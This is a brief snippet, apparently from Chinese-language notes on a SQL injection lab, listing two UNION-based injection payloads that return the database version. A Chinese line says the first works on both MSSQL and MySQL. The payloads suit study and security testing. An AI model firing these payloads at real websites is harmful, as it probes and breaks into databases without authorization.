payload:

```javascript
'union+select+null,@@version--+
```

改查询语句再mssql和mysql上都适用



也可使用:

```javascript
'union+select+null,version()--+
```

